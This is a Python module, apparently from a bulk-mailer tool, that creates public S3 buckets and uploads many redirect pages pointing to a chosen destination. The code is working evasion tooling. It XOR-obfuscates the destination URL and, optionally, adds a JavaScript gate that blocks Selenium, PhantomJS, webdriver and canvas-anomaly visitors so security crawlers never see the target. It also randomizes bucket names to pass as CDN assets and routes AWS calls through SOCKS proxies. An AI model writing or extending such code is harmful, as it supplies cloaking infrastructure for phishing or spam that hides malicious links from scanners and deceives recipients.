"""S3 redirect link generator — creates a public bucket and uploads N HTML
redirect files. Returns path-style URLs."""
import logging
import secrets
import string
import time
from typing import Optional

logger = logging.getLogger("mailer.s3_redirect")


def _obfuscate_url(url: str) -> str:
    """XOR-obfuscate the destination URL so it's not grep-able from the
    HTML source. The JS on the page reverses it at runtime."""
    import base64
    key = secrets.token_bytes(1)[0] | 1  # non-zero single-byte XOR key
    xored = bytes(b ^ key for b in url.encode("utf-8"))
    payload = bytes([key]) + xored
    return base64.b64encode(payload).decode("ascii")


def _redirect_html(destination: str, bot_filter: bool = False) -> str:
    """Generate the redirect HTML page. When bot_filter=True, uses a
    multi-layer JS bot detection gate instead of a bare meta-refresh.
    The destination URL is XOR-obfuscated either way so crawlers can't
    extract it from the static HTML."""
    if not bot_filter:
        enc = _obfuscate_url(destination)
        return (
            '<!DOCTYPE html><html><head><meta charset="utf-8">'
            '<script>'
            f'(function(){{var d=atob("{enc}");var k=d.charCodeAt(0);'
            'var u="";for(var i=1;i<d.length;i++){u+=String.fromCharCode(d.charCodeAt(i)^k);}'
            'window.location.replace(u);})()'
            '</script></head><body></body></html>'
        )

    enc = _obfuscate_url(destination)
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<style>body{margin:0;font-family:sans-serif;display:flex;align-items:center;'
        'justify-content:center;min-height:100vh;background:#fafafa;color:#333}'
        '.ld{width:28px;height:28px;border:3px solid #ddd;border-top-color:#555;'
        'border-radius:50%%;animation:s .7s linear infinite}'
        '@keyframes s{to{transform:rotate(360deg)}}</style>'
        '</head><body><div class="ld"></div>'
        '<script>'
        '(function(){'
        'var _e="' + enc + '";'
        'function _d(e){var d=atob(e);var k=d.charCodeAt(0);var u="";'
        'for(var i=1;i<d.length;i++){u+=String.fromCharCode(d.charCodeAt(i)^k);}return u;}'

        'var dominated=false;'
        'if(navigator.webdriver)dominated=true;'
        'if(window._phantom||window.callPhantom||window.__phantomas)dominated=true;'
        'if(window._selenium_ide_recorder||window.__webdriver_evaluate||window.__driver_evaluate)dominated=true;'
        'if(document.__selenium_unwrapped||document.__webdriver_evaluate||document.__fxdriver_evaluate)dominated=true;'
        'if(navigator.languages===undefined||navigator.languages.length===0)dominated=true;'
        'if(!window.chrome&&/Chrome/.test(navigator.userAgent))dominated=true;'
        'if(navigator.plugins===undefined)dominated=true;'

        'var t0=Date.now();'

        'var cOk=false;'
        'try{'
        'var cv=document.createElement("canvas");cv.width=60;cv.height=20;'
        'var cx=cv.getContext("2d");'
        'cx.textBaseline="top";cx.font="14px Arial";cx.fillStyle="#a1c";'
        'cx.fillRect(0,0,60,20);cx.fillStyle="#1a3";cx.fillText("bv",2,0);'
        'var td=cx.getImageData(0,0,60,20).data;'
        'var sum=0;for(var i=0;i<td.length;i+=4){sum+=td[i]+td[i+1]+td[i+2];}'
        'cOk=(sum>0&&sum<td.length*200);'
        '}catch(e){cOk=true;}'

        'var sOk=(screen.width>0&&screen.height>0&&window.outerWidth>0);'

        'function go(){'
        'var dt=Date.now()-t0;'
        'if(dominated)return;'
        'if(dt<40)return;'
        'if(!cOk&&!sOk)return;'
        'window.location.replace(_d(_e));'
        '}'
        'setTimeout(go,150+Math.floor(Math.random()*350));'
        '})();'
        '</script></body></html>'
    )


def _random_suffix(n: int = 8) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(n))


_PREFIX_ADJ = ["web", "static", "public", "cdn", "img", "media", "assets",
                "content", "files", "storage", "uploads", "cache", "shared",
                "cloud", "prod", "app", "core", "edge", "digital", "resource",
                "site", "brand", "portal", "hub", "vault", "delivery", "pub"]
_PREFIX_NOUN = ["assets", "media", "cdn", "store", "cache", "content", "img",
                 "files", "static", "hub", "pool", "hosting", "data", "cloud",
                 "vault", "share", "delivery", "pack"]


def _new_bucket_name(prefix: str = "", tag: str = "", region: str = "") -> str:
    """AWS-konformer Bucket-Name — 4 random Naming-Strategien (analog zu
    s3_cdn.py). `prefix` und `tag` sind Legacy-Parameter und werden
    ignoriert — der Name soll komplett random aussehen, keine
    Mailer-Signatur ("lk-…") mehr.

    Strategien (je 25% Wahrscheinlichkeit):
      1) generisches Substantiv:    media-a7f3b2-891234
      2) Adjektiv+Substantiv:       web-assets-a7f3b2-891234
      3) SDK-like mit Region:       s3-eu-central-1-a7f3b2-891234
      4) reiner hex-Token:          a7f3b2c891234abc
    """
    token = _random_suffix(8)
    stamp = str(int(time.time()))[-6:]
    strategy = secrets.randbelow(4)
    if strategy == 0:
        pfx = secrets.choice(_PREFIX_NOUN)
    elif strategy == 1:
        pfx = f"{secrets.choice(_PREFIX_ADJ)}-{secrets.choice(_PREFIX_NOUN)}"
    elif strategy == 2 and region:
        pfx = f"s3-{region.lower()}"
    else:
        return f"{token}{stamp}"
    return f"{pfx}-{token}-{stamp}"


_SOCKS_PATCHED = False


def _normalize_proxy(value: str) -> str:
    """Accept SMTP-style or URL-style proxies and emit a valid URL.

    Examples
        socks5://1.2.3.4:1080:user:pass  -> socks5://user:pass@1.2.3.4:1080
        1.2.3.4:1080:user:pass            -> http://user:pass@1.2.3.4:1080
        1.2.3.4:1080                      -> http://1.2.3.4:1080
        http://user:pass@host:port        -> unchanged
    """
    value = (value or "").strip()
    if not value:
        return ""
    if "://" in value:
        scheme, rest = value.split("://", 1)
    else:
        scheme, rest = "http", value
    if "@" in rest:
        return f"{scheme}://{rest}"
    parts = rest.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"{scheme}://{rest}"
    return f"{scheme}://{rest}"


def _patch_botocore_socks():
    """Teach botocore to use urllib3's SOCKSProxyManager for socks://
    proxy URLs. PySocks must be installed (it ships with urllib3[socks])."""
    global _SOCKS_PATCHED
    if _SOCKS_PATCHED:
        return
    try:
        from botocore.httpsession import URLLib3Session, ProxyConfiguration
        from urllib3.contrib.socks import SOCKSProxyManager
    except Exception:
        return

    SOCKS_SCHEMES = ("socks4://", "socks4a://", "socks5://", "socks5h://")
    SOCKS_PREFIXES = ("socks4:", "socks4a:", "socks5:", "socks5h:")

    # 1. ProxyConfiguration._fix_proxy_url only whitelists http:/https: —
    # without this patch every socks5:// proxy gets "http://" jammed in
    # front, producing the classic "http://socks5://..." double-prefix.
    _orig_fix = ProxyConfiguration._fix_proxy_url

    def _patched_fix(self, proxy_url):
        if proxy_url.startswith(SOCKS_PREFIXES):
            return proxy_url
        return _orig_fix(self, proxy_url)

    ProxyConfiguration._fix_proxy_url = _patched_fix

    # 2. _get_proxy_manager needs to hand SOCKS URLs to SOCKSProxyManager
    # instead of the default urllib3 ProxyManager (which only speaks HTTP).
    _orig_get = URLLib3Session._get_proxy_manager

    def _patched_get(self, proxy_url):
        if proxy_url in self._proxy_managers:
            return self._proxy_managers[proxy_url]
        if proxy_url.startswith(SOCKS_SCHEMES):
            proxy_headers = self._proxy_config.proxy_headers_for(proxy_url)
            pool_kwargs = self._get_pool_manager_kwargs(proxy_headers=proxy_headers)
            allowed = {k: v for k, v in pool_kwargs.items()
                        if k in ("num_pools", "headers", "maxsize", "block",
                                  "timeout", "retries", "ssl_context", "ca_certs",
                                  "ca_cert_dir", "cert_file", "key_file")}
            pm = SOCKSProxyManager(proxy_url, **allowed)
            # NOTE: deliberately do NOT overwrite pool_classes_by_scheme like
            # the parent does — SOCKSProxyManager ships SOCKS-aware pool
            # classes that pass _socks_options to the connection; the default
            # HTTPSConnection rejects that kwarg.
            self._proxy_managers[proxy_url] = pm
            return pm
        return _orig_get(self, proxy_url)

    URLLib3Session._get_proxy_manager = _patched_get
    _SOCKS_PATCHED = True


def make_s3_client(access_key: str, secret_key: str, region: str,
                    proxy: str = ""):
    """Build a boto3 S3 client. `proxy` accepts both URL- and SMTP-style
    strings and supports http://, https://, socks4://, socks5:// schemes.
    SOCKS routing requires PySocks (ships with urllib3[socks]).

    A short timeout (10s connect, 30s read) + low retries are configured
    so a single bad bucket operation can't stall the generator for
    minutes — the caller already retries the propagation-sensitive
    calls with its own short backoff."""
    import boto3
    from botocore.config import Config

    proxy = _normalize_proxy(proxy)
    cfg_kwargs = {
        "connect_timeout": 10,
        "read_timeout": 30,
        "retries": {"max_attempts": 3, "mode": "standard"},
    }
    if proxy:
        if proxy.startswith(("socks4://", "socks4a://", "socks5://", "socks5h://")):
            _patch_botocore_socks()
        cfg_kwargs["proxies"] = {"http": proxy, "https": proxy}

    return boto3.client(
        "s3",
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        region_name=region,
        config=Config(**cfg_kwargs),
    )


def create_public_bucket(s3, bucket: str, region: str):
    """Create bucket and configure for public-read static hosting."""
    import time as _t
    if region == "us-east-1":
        s3.create_bucket(Bucket=bucket)
    else:
        s3.create_bucket(
            Bucket=bucket,
            CreateBucketConfiguration={"LocationConstraint": region},
        )

    # Wait for AWS's regional control plane to acknowledge the new
    # bucket. Without this delay the next API call (put_bucket_policy
    # etc.) often hits "NoSuchBucket" briefly and triggers boto3's
    # default retry chain, which makes single-bucket creation feel
    # like it's hanging. head_bucket polls cheaply until the bucket
    # is visible.
    waiter_max = 8
    for i in range(waiter_max):
        try:
            s3.head_bucket(Bucket=bucket)
            break
        except Exception:
            _t.sleep(0.4)

    # Each of the following calls can still fail with NoSuchBucket on
    # an unlucky propagation window. Retry each one a couple of times.
    def _retry(fn, attempts: int = 3, delay: float = 0.5):
        last = None
        for _ in range(attempts):
            try:
                return fn()
            except Exception as e:
                last = e
                _t.sleep(delay)
        if last:
            raise last

    _retry(lambda: s3.delete_public_access_block(Bucket=bucket))
    _retry(lambda: s3.put_bucket_ownership_controls(
        Bucket=bucket,
        OwnershipControls={"Rules": [{"ObjectOwnership": "BucketOwnerPreferred"}]},
    ))

    import json as _json
    policy = {
        "Version": "2012-10-17",
        "Statement": [{
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": f"arn:aws:s3:::{bucket}/*",
        }],
    }
    _retry(lambda: s3.put_bucket_policy(Bucket=bucket, Policy=_json.dumps(policy)))


def generate_links(
    destination: str,
    count: int,
    access_key: str,
    secret_key: str,
    region: str,
    bucket_prefix: str = "lk",
    tag: str = "",
    bot_filter: bool = False,
    progress_cb: Optional[callable] = None,
) -> list:
    """Create a fresh public bucket and upload `count` redirect pages.
    Returns list of path-style public URLs (no .html extension).
    progress_cb(done, total, ok, errors) called after each upload."""
    s3 = make_s3_client(access_key, secret_key, region)

    bucket = _new_bucket_name(region=region)
    for attempt in range(3):
        try:
            create_public_bucket(s3, bucket, region)
            break
        except s3.exceptions.BucketAlreadyOwnedByYou:
            break
        except s3.exceptions.BucketAlreadyExists:
            bucket = _new_bucket_name(region=region)
        except Exception as e:
            if attempt == 2:
                raise
            logger.warning("Bucket creation retry %d: %s", attempt + 1, e)
            bucket = _new_bucket_name(region=region)

    body = _redirect_html(destination, bot_filter=bot_filter).encode("utf-8")

    urls = []
    ok = 0
    errors = 0
    for i in range(count):
        key = _random_suffix(10)
        try:
            s3.put_object(
                Bucket=bucket,
                Key=key,
                Body=body,
                ContentType="text/html; charset=utf-8",
                CacheControl="no-cache",
            )
            urls.append(f"https://s3.{region}.amazonaws.com/{bucket}/{key}")
            ok += 1
        except Exception as e:
            errors += 1
            logger.warning("S3 upload failed (%d/%d): %s", i + 1, count, e)
        if progress_cb:
            try:
                progress_cb(i + 1, count, ok, errors)
            except Exception:
                pass

    return urls
